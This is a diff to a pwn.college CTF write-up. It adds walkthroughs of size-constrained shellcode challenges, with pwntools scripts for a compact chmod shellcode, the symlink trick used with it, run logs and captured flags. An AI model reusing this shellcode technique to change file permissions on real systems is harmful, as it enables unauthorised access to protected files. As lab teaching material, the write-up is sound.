@@ -579,6 +579,480 @@ pwn.college{ExWjiR3WDqi0KdvDkYToGHFiGhQ.0lMyIDL4ITM0EzW}
 
 &nbsp;
 
+## Byte Budget
+
+> Write and execute shellcode to read the flag, but you only get 18 bytes.
+
+```
+hacker@program-security~byte-budget:/$ /challenge/byte-budget 
+###
+### Welcome to /challenge/byte-budget!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x2e0a9000!
+Reading 0x12 bytes from stdin.
+```
+
+We only get 18 bytes to fit our shellcode into.
+
+We can do a `chmod` syscall and change the permissions of the flag file.
+
+### `chmod` syscall
+
+| %rax | arg0 (%rdi)          | arg1 (%rsi)    | 
+| :--- | :------------------- | :------------- | 
+| 0x5a | const char *filename | umode_t mode   |
+
+The first argument is a pointer to the `filename`, and the second argument is the `mode` which for us would be 0777 or `0x1ff`.
+
+If we were to push `/flag` onto the stack and pop it's pointer into `rdi`, it would take too many bytes.
+This is where we can utilize [symlinks](https://en.wikipedia.org/wiki/Symbolic_link).
+
+### Symbolic linking
+
+Creating a symbolic link of `/flag` would allow us to access it by accessing the symlink. As the symlink is entirely under our control, we can set whatever name for it.
+
+The identifier of the `chmod` syscall is `0x5a`, which happens to be `Z` in ASCII. If we name the synlink `Z`, we can store the value and the pointer both, in the relevant registers, `rax` and `rdi` respectively.
+
+```
+hacker@program-security~byte-budget:/$ ln -sf /flag ~/Z
+```
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+shellcode_asm = """
+   /* chmod("Z", 0777) */
+   push 0x5a
+   push rsp
+   pop rdi
+   pop rax
+   mov si, 0x1ff
+	syscall
+"""
+
+shellcode = asm(shellcode_asm)
+sys.stdout.buffer.write(shellcode)
+print(disasm(shellcode), file=sys.stderr)
+```
+
+```
+hacker@program-security~byte-budget:~$ python ~/script.py | /challenge/byte-budget
+###
+### Welcome to /challenge/byte-budget!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x2e0a9000!
+Reading 0x12 bytes from stdin.
+
+   0:   6a 5a                   push   0x5a
+   2:   54                      push   rsp
+   3:   5f                      pop    rdi
+   4:   58                      pop    rax
+   5:   66 be ff 01             mov    si, 0x1ff
+   9:   0f 05                   syscall
+Removing write permissions from first 4096 bytes of shellcode.
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x000000002e0a9000 | 6a 5a                                         | push 0x5a
+0x000000002e0a9002 | 54                                            | push rsp
+0x000000002e0a9003 | 5f                                            | pop rdi
+0x000000002e0a9004 | 58                                            | pop rax
+0x000000002e0a9005 | 66 be ff 01                                   | mov si, 0x1ff
+0x000000002e0a9009 | 0f 05                                         | syscall 
+
+Executing shellcode!
+
+Segmentation fault
+```
+
+The Segfault happens after our `chmod` syscall is executed.
+
+```
+hacker@program-security~byte-budget:~$ cat ~/Z
+pwn.college{04NuaC8j3tSCz0WmiNt4s7uTBXZ.0FNyIDL4ITM0EzW}
+```
+
+&nbsp;
+
+## ClobberCode
+
+> Write and execute shellcode to read the flag, but your input has data inserted into it before being executed.
+
+```
+hacker@program-security~clobbercode:/$ /challenge/clobbercode 
+###
+### Welcome to /challenge/clobbercode!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x290ad000!
+Reading 0x1000 bytes from stdin.
+```
+
+In order to not have our shellcode clobbered, we have to fit it within 10 bytes.
+
+```asm
+5:   66 be ff 01             mov    si, 0x1ff
+```
+
+Previously, our instruction to move the `mode=0x1ff` argument in `chmod` took 4 bytes. However, we don't actually need `mode=0x1ff`, we could work with `mode=0x4` which allows read for all.
+
+### Exploit
+
+```
+hacker@program-security~byte-budget:/$ ln -sf /flag ~/Z
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+shellcode_asm = """
+   /* chmod("z", 0004) */
+   push 0x5a
+   push rsp
+   pop rdi
+   pop rax
+   mov sil, 0x4
+   syscall
+"""
+
+shellcode = asm(shellcode_asm)
+sys.stdout.buffer.write(shellcode)
+print(disasm(shellcode), file=sys.stderr)
+```
+
+```
+hacker@program-security~clobbercode:~$ python ~/script.py | /challenge/clobbercode 
+###
+### Welcome to /challenge/clobbercode!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x290ad000!
+Reading 0x1000 bytes from stdin.
+
+   0:   6a 5a                   push   0x5a
+   2:   54                      push   rsp
+   3:   5f                      pop    rdi
+   4:   58                      pop    rax
+   5:   40 b6 04                mov    sil, 0x4
+   8:   0f 05                   syscall
+Executing filter...
+
+This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an
+instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your
+shellcode.
+
+Removing write permissions from first 4096 bytes of shellcode.
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x00000000290ad000 | 6a 5a                                         | push 0x5a
+0x00000000290ad002 | 54                                            | push rsp
+0x00000000290ad003 | 5f                                            | pop rdi
+0x00000000290ad004 | 58                                            | pop rax
+0x00000000290ad005 | 40 b6 04                                      | mov sil, 4
+0x00000000290ad008 | 0f 05                                         | syscall 
+
+Executing shellcode!
+
+Segmentation fault
+```
+
+```
+hacker@program-security~clobbercode:~$ cat ~/Z
+pwn.college{kXvp9dNmYI77jNHDW9Cbj7V6ClS.0VNyIDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Diverse Delivery
+
+> Write and execute shellcode to read the flag, but every byte in your input must be unique.
+
+```
+hacker@program-security~diverse-delivery:/$ /challenge/diverse-delivery 
+###
+### Welcome to /challenge/diverse-delivery!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x22f00000!
+Reading 0x1000 bytes from stdin.
+```
+
+Since our shellcode from the [Clobbercode](#clobbercode) challenge, had all unique bytes, it should work here.
+
+### Exploit
+
+```
+hacker@program-security~byte-budget:/$ ln -sf /flag ~/Z
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+shellcode_asm = """
+   /* chmod("z", 0004) */
+   push 0x5a
+   push rsp
+   pop rdi
+   pop rax
+   mov sil, 0x4
+   syscall
+"""
+
+shellcode = asm(shellcode_asm)
+sys.stdout.buffer.write(shellcode)
+print(disasm(shellcode), file=sys.stderr)
+```
+
+```
+hacker@program-security~diverse-delivery:~$ python ~/script.py | /challenge/diverse-delivery 
+###
+### Welcome to /challenge/diverse-delivery!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x22f00000!
+Reading 0x1000 bytes from stdin.
+
+   0:   6a 5a                   push   0x5a
+   2:   54                      push   rsp
+   3:   5f                      pop    rdi
+   4:   58                      pop    rax
+   5:   40 b6 04                mov    sil, 0x4
+   8:   0f 05                   syscall
+Executing filter...
+
+This challenge requires that every byte in your shellcode is unique!
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000022f00000 | 6a 5a                                         | push 0x5a
+0x0000000022f00002 | 54                                            | push rsp
+0x0000000022f00003 | 5f                                            | pop rdi
+0x0000000022f00004 | 58                                            | pop rax
+0x0000000022f00005 | 40 b6 04                                      | mov sil, 4
+0x0000000022f00008 | 0f 05                                         | syscall 
+
+Executing shellcode!
+
+Segmentation fault
+```
+
+```
+hacker@program-security~diverse-delivery:~$ cat ~/Z
+pwn.college{A3YYHPRU8SL_mu2vpUotvV6C-U3.0FOyIDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Pocket Payload
+
+> Write and execute shellcode to read the flag, but this time you only get 12 bytes!
+
+```
+hacker@program-security~pocket-payload:/$ /challenge/pocket-payload 
+###
+### Welcome to /challenge/pocket-payload!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x15233000!
+Reading 0xc bytes from stdin.
+```
+
+Again, since our shellcode from [Clobbercode](#clobbercode) was 10 bytes only, it should work here.
+
+### Exploit
+
+```
+hacker@program-security~byte-budget:/$ ln -sf /flag ~/Z
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+shellcode_asm = """
+   /* chmod("z", 0004) */
+   push 0x5a
+   push rsp
+   pop rdi
+   pop rax
+   mov sil, 0x4
+   syscall
+"""
+
+shellcode = asm(shellcode_asm)
+sys.stdout.buffer.write(shellcode)
+print(disasm(shellcode), file=sys.stderr)
+```
+
+```
+hacker@program-security~pocket-payload:~$ python ~/script.py | /challenge/pocket-payload 
+###
+### Welcome to /challenge/pocket-payload!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x15233000!
+Reading 0xc bytes from stdin.
+
+   0:   6a 5a                   push   0x5a
+   2:   54                      push   rsp
+   3:   5f                      pop    rdi
+   4:   58                      pop    rax
+   5:   40 b6 04                mov    sil, 0x4
+   8:   0f 05                   syscall
+Removing write permissions from first 4096 bytes of shellcode.
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000015233000 | 6a 5a                                         | push 0x5a
+0x0000000015233002 | 54                                            | push rsp
+0x0000000015233003 | 5f                                            | pop rdi
+0x0000000015233004 | 58                                            | pop rax
+0x0000000015233005 | 40 b6 04                                      | mov sil, 4
+0x0000000015233008 | 0f 05                                         | syscall 
+
+Executing shellcode!
+
+Segmentation fault
+```
+
+```
+hacker@program-security~pocket-payload:~$ cat ~/Z
+pwn.college{kwjklfeOh4LdJaEQD1NDoUm9jr7.0VOyIDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Micro Menace
+
+> Write and execute shellcode to read the flag, but this time you only get 6 bytes :)
+
+```
+hacker@program-security~micro-menace:/$ /challenge/micro-menace 
+###
+### Welcome to /challenge/micro-menace!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x2a047000!
+Reading 0x6 bytes from stdin.
+```
+
+```
+───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────
+ RAX  0
+ RBX  0x5c48118237e0 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7bbac5b94297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x2a047000 ◂— 0xcc
+ RDI  0x7bbac5c747e0 (_IO_stdfile_1_lock) ◂— 0
+ RSI  0x7bbac5c73723 (_IO_2_1_stdout_+131) ◂— 0xc747e0000000000a /* '\n' */
+ R8   0x16
+ R9   9
+ R10  0x5c4811824113 ◂— 0x525245000000000a /* '\n' */
+ R11  0x246
+ R12  0x5c4811823200 (_start) ◂— endbr64 
+ R13  0x7fff21d935c0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff21d934d0 ◂— 0
+ RSP  0x7fff21d93488 —▸ 0x5c48118237c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
+ RIP  0x2a047001 ◂— 0
+────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────
+ ► 0x2a047001    add    byte ptr [rax], al
+   0x2a047003    add    byte ptr [rax], al
+   0x2a047005    add    byte ptr [rax], al
+   0x2a047007    add    byte ptr [rax], al
+   0x2a047009    add    byte ptr [rax], al
+   0x2a04700b    add    byte ptr [rax], al
+   0x2a04700d    add    byte ptr [rax], al
+   0x2a04700f    add    byte ptr [rax], al
+   0x2a047011    add    byte ptr [rax], al
+   0x2a047013    add    byte ptr [rax], al
+   0x2a047015    add    byte ptr [rax], al
+──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff21d93488 —▸ 0x5c48118237c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
+01:0008│-040 0x7fff21d93490 —▸ 0x7fff21d934b6 ◂— 0x2710118232000000
+02:0010│-038 0x7fff21d93498 —▸ 0x7fff21d935d8 —▸ 0x7fff21d94690 ◂— 0
+03:0018│-030 0x7fff21d934a0 —▸ 0x7fff21d935c8 —▸ 0x7fff21d94678 ◂— 0
+04:0020│-028 0x7fff21d934a8 ◂— 0x1118237e0
+05:0028│-020 0x7fff21d934b0 ◂— 0
+06:0030│-018 0x7fff21d934b8 ◂— 0x271011823200
+07:0038│-010 0x7fff21d934c0 —▸ 0x7fff21d935d0 ◂— 0
+```
+
+&nbsp;
+
 ## Login Leakage (Easy)
 
 > Leverage memory corruption to satisfy a simple constraint
@@ -893,7 +1367,7 @@ Non-debugging symbols:
 0x00000000000022a8  _fini
 ```
 
-## `challenge()`
+### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -1258,7 +1732,7 @@ Since, we control the first 8 bytes of our payload that we write into the buffer
 
 That way, the check will succeed and the challenge will call `win()` for us.
 
-```py title="~/script.py showLineNumbers
+```py title="~/script.py" showLineNumbers
 from pwn import *
 
 p = process('/challenge/login-leakage-easy')
